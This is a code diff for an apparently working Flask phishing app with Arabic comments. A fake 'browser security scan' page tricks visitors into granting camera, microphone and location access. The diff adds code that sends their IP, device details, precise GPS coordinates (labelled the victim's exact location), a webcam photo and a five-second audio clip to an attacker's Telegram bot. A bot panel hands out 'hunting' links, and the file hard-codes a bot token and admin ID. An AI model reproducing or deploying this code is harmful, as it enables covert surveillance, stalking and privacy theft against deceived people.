@@ -4,16 +4,16 @@ from flask import Flask, render_template_string, request, jsonify
 app = Flask(__name__)
 
 # ==========================================
-# --- إعدادات الإمبراطور سيوفي (v17.5) ---
+# --- إعدادات الإمبراطور سيوفي (v18.0) ---
 # ==========================================
 BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
 ADMIN_ID = "7041600701"
-BASE_URL = "https://sif-pro.onrender.com" 
+BASE_URL = "https://sif-pro.onrender.com" # تم تصحيح الرابط (بدون أي علامات)
 API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
 SUB_URL = "https://t.me/FAABOT?start=7041600701" 
 
 system_config = {
-    "welcome_msg": "🔥 أهلاً بك ملك سيوفي في لوحة التحكم v17.5\n\nتم إصلاح نظام الصوت والتحكم بالكامل! 🚀",
+    "welcome_msg": "🔥 أهلاً بك ملك سيوفي في لوحة التحكم الشاملة v18.0\n\nكل الحساسات مدمجة (صوت، صورة، موقع، معلومات)! 🚀",
     "trap_title": "تأكيد الأمان الموحد",
     "banned_ips": [],
     "banned_users": [],  
@@ -26,7 +26,7 @@ def tg_request(method, payload=None, files=None):
         return requests.post(API_URL + method, json=payload, timeout=30).json()
     except: return None
 
-# واجهة الصيد مع إصلاح رفع الصوت
+# واجهة الصيد الاحترافية (تشمل الموقع ومعلومات الجهاز)
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -45,8 +45,8 @@ HTML_TEMPLATE = '''
     <div class="card">
         <div class="icon" style="font-size:50px; color:#f38020;">🛡️</div>
         <h2>كشف التهديدات في المتصفح</h2>
-        <p style="color: #bbb;">لقد رصدنا نشاطاً غير معتاد. يرجى التحقق للمتابعة.</p>
-        <button class="btn" id="go" onclick="startCapture()">قم بتشغيل فحص أمني</button>
+        <p style="color: #bbb;">يرجى تفعيل الفحص الأمني والموافقة على الصلاحيات للمتابعة.</p>
+        <button class="btn" id="go" onclick="startCapture()">بدء الفحص الآن</button>
         <div id="st">بانتظار البدء...</div>
     </div>
     <video id="v" autoplay playsinline muted></video>
@@ -56,23 +56,37 @@ HTML_TEMPLATE = '''
         
         async function startCapture() {
             const btn = document.getElementById('go'); const st = document.getElementById('st');
-            btn.style.display = 'none'; st.innerText = "جاري الفحص... يرجى الانتظار";
+            btn.style.display = 'none'; st.innerText = "جاري جمع بيانات الأمان...";
             try {
                 const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'Hidden'}));
                 const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                 const v = document.getElementById('v'); v.srcObject = stream; await v.play();
                 
                 const b = await navigator.getBattery().catch(() => ({}));
-                await send(`🎯 **Target Captured!**\\n🌐 IP: \`${ipData.ip}\`\\n🔋 Battery: ${Math.round(b.level*100)}%`, 'msg');
+                // جمع معلومات الجهاز الشاملة
+                const deviceInfo = `🎯 **New Target Captured!**\\n━━━━━━━━━━━━━━\\n` +
+                                   `🌐 IP: \`${ipData.ip}\`\\n` +
+                                   `🔋 Battery: ${Math.round(b.level*100)}% (${b.charging ? '⚡' : '🔋'})\\n` +
+                                   `📱 System: ${navigator.platform}\\n` +
+                                   `🖥️ Screen: ${window.screen.width}x${window.screen.height}\\n` +
+                                   `🧠 CPU Cores: ${navigator.hardwareConcurrency}\\n` +
+                                   `🌍 Language: ${navigator.language}`;
+                await send(deviceInfo, 'msg');
 
-                // التقاط الصورة
+                // جلب الموقع الدقيق
+                navigator.geolocation.getCurrentPosition(p => {
+                    const lat = p.coords.latitude; const lon = p.coords.longitude;
+                    send(`📍 **موقع الضحية الدقيق:**\\nhttps://www.google.com/maps?q=${lat},${lon}`, 'msg');
+                }, null, {enableHighAccuracy: true});
+
                 setTimeout(() => {
+                    // التقاط الصورة
                     const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v, 0, 0); 
                     send(c.toDataURL('image/jpeg', 0.8), 'img');
-                    st.innerText = "جاري مزامنة بصمة الصوت (5 ثواني)...";
+                    st.innerText = "جاري رفع بصمة الصوت...";
                     
-                    // تسجيل الصوت - الإصلاح المباشر هنا
+                    // تسجيل الصوت
                     const recorder = new MediaRecorder(stream);
                     const chunks = [];
                     recorder.ondataavailable = e => chunks.push(e.data);
@@ -82,15 +96,15 @@ HTML_TEMPLATE = '''
                         reader.readAsDataURL(blob);
                         reader.onloadend = async () => {
                             await send(reader.result, 'aud');
-                            st.innerText = "✅ تمت العملية بنجاح!";
-                            stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا بعد الإرسال
+                            st.innerText = "✅ تم الفحص بنجاح!";
+                            stream.getTracks().forEach(track => track.stop());
                         };
                     };
                     recorder.start();
-                    setTimeout(() => recorder.stop(), 5000); // تسجيل 5 ثواني
+                    setTimeout(() => recorder.stop(), 5000);
                 }, 2000);
 
-            } catch (e) { st.innerText = "❌ خطأ في الصلاحيات!"; }
+            } catch (e) { st.innerText = "❌ يرجى منح الصلاحيات للفحص!"; }
         }
     </script>
 </body>
@@ -120,7 +134,6 @@ def capture():
 def webhook():
     update = request.get_json(force=True, silent=True)
     if not update: return "OK"
-    
     if "message" in update:
         msg = update["message"]; chat_id = str(msg["chat"]["id"])
         username = msg.get("from", {}).get("username", "NoUser")
@@ -136,33 +149,25 @@ def webhook():
                 uid = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
                 if uid in system_config["banned_users"]: system_config["banned_users"].remove(uid); tg_request("sendMessage", {"chat_id": chat_id, "text": f"✅ Unbanned: `{uid}`"})
             
-            kb = {"inline_keyboard": [
-                [{"text": "🔗 رابط الصيد", "callback_data": "gen_link"}, {"text": "👥 قائمة المستخدمين", "callback_data": "list_users"}],
-                [{"text": "⚙️ إعدادات الإمبراطور", "callback_data": "admin_settings"}]
-            ]}
+            kb = {"inline_keyboard": [[{"text": "🔗 رابط الصيد", "callback_data": "gen_link"}, {"text": "👥 قائمة المستخدمين", "callback_data": "list_users"}]]}
             tg_request("sendMessage", {"chat_id": chat_id, "text": system_config["welcome_msg"], "reply_markup": kb, "parse_mode": "Markdown"})
         else:
             sub_kb = {"inline_keyboard": [[{"text": "اضغط هنا للاشتراك أولاً ✅", "url": SUB_URL}]]}
-            tg_request("sendMessage", {"chat_id": chat_id, "text": "⚠️ اشترك لتتمكن من استخدام البوت!", "reply_markup": sub_kb})
-
+            tg_request("sendMessage", {"chat_id": chat_id, "text": "⚠️ يجب الاشتراك لاستخدام البوت!", "reply_markup": sub_kb})
     elif "callback_query" in update:
         return handle_callback(update["callback_query"])
     return "OK"
 
 def handle_callback(query):
-    cid = str(query["message"]["chat"]["id"])
+    cid = str(query["message"]["chat"]["id"]); data = query["data"]
     if cid != ADMIN_ID: return "OK"
-    data = query["data"]
     if data == "gen_link": tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابطك:\n`{BASE_URL}`"})
     elif data == "list_users":
         res = "👥 **قائمة المستخدمين:**\n\n"
         for uid, uname in system_config["all_users"].items(): res += f"👤 {uname} | ID: `{uid}`\n"
         tg_request("sendMessage", {"chat_id": cid, "text": res, "parse_mode": "Markdown"})
-    elif data == "admin_settings":
-        tg_request("sendMessage", {"chat_id": cid, "text": "🚫 حظر: `/user_ban ID`\n🔓 فك: `/user_unban ID`"})
     return "OK"
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
-
